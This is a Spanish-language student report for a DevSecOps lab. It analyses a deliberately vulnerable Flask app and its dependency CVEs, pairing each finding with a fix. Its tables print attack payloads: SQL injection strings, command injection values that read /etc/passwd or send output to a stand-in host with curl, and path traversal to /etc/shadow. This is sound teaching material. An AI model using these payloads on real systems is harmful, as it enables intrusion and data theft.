# Reporte de Vulnerabilidades — Lab 4 DevSecOps
**Alumno:** Apellidos, Nombre  
**Repositorio:** https://github.com/tu-usuario/devsecops-lab-apellido  
**Fecha:** Mayo 2026

---

## Paso 2.1 — Análisis manual de app.py (antes del pipeline)

### Vulnerabilidad 1 — Hardcoded Secret

| Campo | Detalle |
|-------|---------|
| **Líneas** | 14–16 |
| **Tipo** | Credenciales hardcodeadas (CWE-798) |
| **Código** | `DB_PASSWORD = 'SuperSecret123!'` / `SECRET_KEY = 'hardcoded-secret-key-never-do-this'` |
| **¿Por qué es peligrosa?** | Cualquier persona con acceso al repositorio (público o privado comprometido) obtiene las credenciales de base de datos y la clave de sesión. Con `SECRET_KEY` se pueden forjar cookies de sesión firmadas. |
| **Payload de ataque** | No requiere payload — la credencial está en texto claro en el código fuente. |
| **Corrección** | Usar variables de entorno: `DB_PASSWORD = os.environ['DB_PASSWORD']` y `SECRET_KEY = os.environ['SECRET_KEY']`. Almacenarlas en GitHub Secrets o un vault (HashiCorp Vault, AWS Secrets Manager). |

---

### Vulnerabilidad 2 — SQL Injection

| Campo | Detalle |
|-------|---------|
| **Línea** | 80 |
| **Tipo** | SQL Injection (OWASP A03:2021, CWE-89) |
| **Código** | `query = f"SELECT id, username, email, role FROM users WHERE username = '{username}'"` |
| **¿Por qué es peligrosa?** | El input del usuario se concatena directamente en la query SQL sin sanitización. Permite extraer toda la base de datos, modificar registros o ejecutar comandos en el motor (en motores como MSSQL con `xp_cmdshell`). |
| **Payload de ataque** | `GET /user?username=' OR '1'='1` → devuelve todos los usuarios. `GET /user?username=' UNION SELECT sqlite_version(),2,3,4--` → obtiene versión de SQLite. |
| **Corrección** | Usar consultas parametrizadas: `cursor.execute("SELECT ... WHERE username = ?", (username,))` — nunca concatenar strings en queries SQL. |

---

### Vulnerabilidad 3 — Command Injection

| Campo | Detalle |
|-------|---------|
| **Línea** | 131 |
| **Tipo** | Command Injection (OWASP A03:2021, CWE-78) |
| **Código** | `subprocess.run(f'ping {flag} 1 {host}', shell=True, ...)` |
| **¿Por qué es peligrosa?** | El parámetro `host` se inserta directamente en un comando de shell con `shell=True`. Un atacante puede encadenar comandos arbitrarios usando `;`, `&&` o `\|`. |
| **Payload de ataque** | `GET /ping?host=8.8.8.8; cat /etc/passwd` → lista usuarios del sistema. `GET /ping?host=8.8.8.8; curl attacker.com/$(whoami)` → exfiltra datos. |
| **Corrección** | Pasar argumentos como lista sin `shell=True`: `subprocess.run(['ping', flag, '1', host], ...)` y validar que `host` sea una IP o dominio válido con regex antes de ejecutar. |

---

### Vulnerabilidad 4 — Debug Mode en producción

| Campo | Detalle |
|-------|---------|
| **Línea** | 161 |
| **Tipo** | Information Exposure / Debug mode (CWE-11) |
| **Código** | `app.run(host='0.0.0.0', debug=True)` |
| **¿Por qué es peligrosa?** | El debugger interactivo de Werkzeug queda expuesto en la red. Con el PIN del debugger (que puede obtenerse por otras vías) se ejecuta código Python arbitrario en el servidor. Además expone stack traces completos con rutas internas, variables y versiones. |
| **Payload de ataque** | Acceder a cualquier endpoint con un error → el traceback revela rutas del sistema, versiones de librerías y valores de variables locales. |
| **Corrección** | `app.run(host='0.0.0.0', debug=False)` en producción. Mejor aún: usar Gunicorn o uWSGI como servidor WSGI y controlar el modo con `FLASK_ENV=production`. |

---

### Vulnerabilidad 5 — Path Traversal

| Campo | Detalle |
|-------|---------|
| **Líneas** | 142–149 |
| **Tipo** | Path Traversal (OWASP A01:2021, CWE-22) |
| **Código** | `log_path = os.path.join('/var/log', log_file)` sin validación |
| **¿Por qué es peligrosa?** | El parámetro `file` no se valida ni se sanitiza. Un atacante puede salir del directorio `/var/log` usando `../` para leer archivos arbitrarios del sistema de archivos. |
| **Payload de ataque** | `GET /logs?file=../../etc/passwd` → lee `/var/log/../../etc/passwd` = `/etc/passwd`. `GET /logs?file=../../etc/shadow` → intenta leer hashes de contraseñas. |
| **Corrección** | Validar con `os.path.realpath()` que la ruta resuelta empiece con `/var/log/`: `if not os.path.realpath(log_path).startswith('/var/log/'): abort(403)`. |

---

## Paso 2.2 — Análisis de requirements.txt

| Paquete | Versión actual | CVE detectado | CVSS | Versión segura |
|---------|---------------|---------------|------|----------------|
| `Flask` | 2.0.1 | — | — | 3.0+ |
| `Werkzeug` | 2.0.1 | CVE-2023-25577 | 7.5 (High) | 3.0.6+ |
| `Jinja2` | 3.0.1 | CVE-2024-22195 | 5.4 (Medium) | 3.1.4+ |
| `cryptography` | 38.0.0 | CVE-2023-0286 | 7.4 (High) | 42.0.8+ |
| `requests` | 2.25.0 | CVE-2023-32681 | 6.1 (Medium) | 2.32.3+ |

---

## Paso 5.1 — Resultados de Semgrep (pipeline)

### Vulnerabilidad detectada 1

| Campo | Detalle |
|-------|---------|
| **Rule ID** | `python.lang.security.audit.formatted-sql-query.formatted-sql-query` |
| **Severidad** | ERROR |
| **Archivo** | `app/app.py` |
| **Línea** | 80 |
| **Descripción** | SQL query construida con f-string — susceptible a SQL injection |
| **Riesgo real** | Permite extraer o modificar toda la base de datos de usuarios |
| **Corrección** | Sustituir f-string por consulta parametrizada con `?` |

### Vulnerabilidad detectada 2

| Campo | Detalle |
|-------|---------|
| **Rule ID** | `python.lang.security.audit.subprocess-shell-true.subprocess-shell-true` |
| **Severidad** | ERROR |
| **Archivo** | `app/app.py` |
| **Línea** | 131 |
| **Descripción** | `subprocess.run()` con `shell=True` e input no sanitizado |
| **Riesgo real** | Ejecución de comandos arbitrarios en el servidor |
| **Corrección** | Pasar argumentos como lista, eliminar `shell=True`, validar input |

### Vulnerabilidad detectada 3

| Campo | Detalle |
|-------|---------|
| **Rule ID** | `python.lang.security.audit.hardcoded-password.hardcoded-password` |
| **Severidad** | WARNING |
| **Archivo** | `app/app.py` |
| **Líneas** | 14–15 |
| **Descripción** | Credenciales hardcodeadas detectadas: `DB_PASSWORD`, `SECRET_KEY` |
| **Riesgo real** | Exposición de credenciales en el repositorio |
| **Corrección** | Variables de entorno + GitHub Secrets |

### Vulnerabilidad detectada 4

| Campo | Detalle |
|-------|---------|
| **Rule ID** | `python.flask.security.audit.debug-enabled.debug-enabled` |
| **Severidad** | WARNING |
| **Archivo** | `app/app.py` |
| **Línea** | 161 |
| **Descripción** | Flask ejecutándose con `debug=True` |
| **Riesgo real** | Debugger interactivo expuesto → RCE potencial |
| **Corrección** | `debug=False` o leer de variable de entorno |

---

## Paso 5.2 — Resultados de pip-audit (pipeline)

### CVE 1

| Campo | Detalle |
|-------|---------|
| **Paquete** | `cryptography` |
| **Versión actual** | 38.0.0 |
| **CVE ID** | CVE-2023-0286 |
| **Severidad CVSS** | 7.4 (High) |
| **Descripción** | Vulnerabilidad en el parsing de certificados X.400 — puede llevar a denegación de servicio o lectura de memoria fuera de límites al procesar certificados maliciosos. |
| **Versión segura** | 42.0.0+ |

### CVE 2

| Campo | Detalle |
|-------|---------|
| **Paquete** | `Werkzeug` |
| **Versión actual** | 2.0.1 |
| **CVE ID** | CVE-2023-25577 |
| **Severidad CVSS** | 7.5 (High) |
| **Descripción** | Parsing malicioso de multipart/form-data puede causar consumo ilimitado de CPU y memoria — denegación de servicio efectiva. |
| **Versión segura** | 3.0.6+ |

### CVE 3

| Campo | Detalle |
|-------|---------|
| **Paquete** | `Jinja2` |
| **Versión actual** | 3.0.1 |
| **CVE ID** | CVE-2024-22195 |
| **Severidad CVSS** | 5.4 (Medium) |
| **Descripción** | XSS en atributos HTML al usar `xmlattr` filter — permite inyectar atributos arbitrarios en el HTML generado. |
| **Versión segura** | 3.1.4+ |
